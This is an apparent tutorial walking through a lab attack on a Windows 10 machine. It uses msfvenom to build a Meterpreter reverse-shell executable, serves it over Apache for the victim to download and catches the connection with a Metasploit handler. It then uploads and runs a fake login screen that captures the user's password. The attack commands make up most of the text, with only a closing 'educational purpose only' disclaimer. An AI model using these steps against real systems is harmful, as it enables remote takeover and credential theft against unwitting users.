## Windows Password Fishing with Fake Login Screen

# Things You Need:
* Kali Linux Machine (attacking machine).
* Windows 10 (victim machine).

# Step 1:
Start your Kali Linux machine and download the fake login screen from [here](https://github.com/bitsadmin/fakelogonscreen/releases)

![image1](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_LVw4yPzVvtjmrfMdAwMkw.png)

# Step 2:
Now unzip the file using the command

```bash
unzip <file-name>.zip
```

![image1](https://miro.medium.com/v2/resize:fit:828/format:webp/1*YJ_Fidq-fKkRmnCES8G-8g.png)

# Step 3:
After doing this you have to create a malicious payload using msfvenom. The exploit is as follow.

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=<listning-ip> lport=<listning-port> -f exe >> <file-name-you-want-to-create>.exe
```

It’s creating a Meterpreter reverse TCP shell payload for a Windows target. Meterpreter is an advanced, dynamically extensible payload that operates in memory.

![image1](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*s9ju1fzKx6Qf70kkcQrGvQ.png)

![image1](https://miro.medium.com/v2/resize:fit:464/format:webp/1*abBUYoHzSYIBeJZnA6fHhg.png)

# Step 4:
First create a directory by the name of share in the location mentioned below and then paste the file that you have created in the directory. (LOCATION: /var/www/html)

```bash
cd /var/www/html
sudo mkdir share
```

Go back to the location where you have created the .exe file and then use this command to paste the file into the directory that you have made.

```bash
sudo cp <file-name> /var/www/html/shares/
```

# Step 5:
Now turn on the Apache2 server by using the following command

```bash
sudo service apache2 start
```

![image1](https://miro.medium.com/v2/resize:fit:522/format:webp/1*IaQyUeHH9IXhzm0CF1EocA.png)

# Step 6:
Now open up your windows 10 machine and then open your favorite browser and by using this format open the server.

```bash
http://<ip-address-of-attacking-machine>/share
```

![image1](https://miro.medium.com/v2/resize:fit:316/format:webp/1*SvQoqF2Jr_DEazGT9VCNCQ.png)

As you can see the file you created is there. So you have to simply download the file from the HTTP Server.

![image1](https://miro.medium.com/v2/resize:fit:640/format:webp/1*cjYd-6MIwIjo0QhQtptvtg.png)

![image1](https://github.com/iabdullah215/Network-Security/assets/121729444/f27d6212-ea98-479c-b6d1-805ffaf1c720)

# Step 7:
After this go back to your Kali Linux machine and start the metasploit tool. First the command to set the module.

```bash
use multi/handler
```

![image1](https://miro.medium.com/v2/resize:fit:640/format:webp/1*Cw4DrI4hQW-SLJtiwXPNRw.png)

# Step 8:
Then set the `Payload`, `LHOST`, and `LPORT` parameters by using the commands below.

```bash
set LHOST <ip-address-of-your-machine>
set LPORT 4444 // it would be set to 4444 by default
set payload windows/meterpreter/reverse_tcp
```

![image1](https://miro.medium.com/v2/resize:fit:750/format:webp/1*vHNY-jUFytRV_RgulOjWhg.png)

# Step 9:
After this use any of the commands mentioned bellow to execute the exploit. After typing the command click the .exe file in the windows to start a connection.

```bash
run
exploit
```

![image1](https://miro.medium.com/v2/resize:fit:828/format:webp/1*hiUqGtFgl3-99E0efg0Gzw.png)

# Step 10:
Now upload the file from your Linux machine to the windows machine in the LOCATION: `/root/Downloads/FakeLogonScreen.exe` (where my file was downloaded) by using the command.


![image1](https://github.com/iabdullah215/Network-Security/assets/121729444/076e3ac5-bb86-4daa-a1de-2da143f3ec7e)

# Step 11:
Now type the command below to enter the windows cmd.

```bash
shell
```

![image1](https://miro.medium.com/v2/resize:fit:640/format:webp/1*viV7AJUGhsU60otvRrgpuw.png)

# Step 12:
After this run `.exe` file by just entering the download directory and typing the name of file i.e. `FakeLogonScreen.exe`

![image1](https://miro.medium.com/v2/resize:fit:640/format:webp/1*ij0x4IIrUuMs-sVci46jiw.png)

# Step 13:
After doing everything right you’ll see that all the running files on the windows will close and a login screen will open. Upon typing the password you’ll receive the feedback on the meterpreter terminal.

![image1](https://miro.medium.com/v2/resize:fit:828/format:webp/1*1jhonIDkgaOJZmRIZVhYLA.png)

# Step 14:
Now type in the password. If you’ll type in the wrong password. It will tell on the terminal that the password is wrong and when you’ll type in the correct password It’ll tell that it is the correct one.

![image1](https://miro.medium.com/v2/resize:fit:390/format:webp/1*1YA-dSqxhBBdbV9e9jzJnA.png)

As I was in my personal user so I can’t compromise that. So I created a test user in order to exploit it. So i again went through all the stuff and yah eventually got the password.

![image1](https://miro.medium.com/v2/resize:fit:494/format:webp/1*H8PTsDeajlosP4tJB5WCkA.png)

## Use it for educational purpose only...
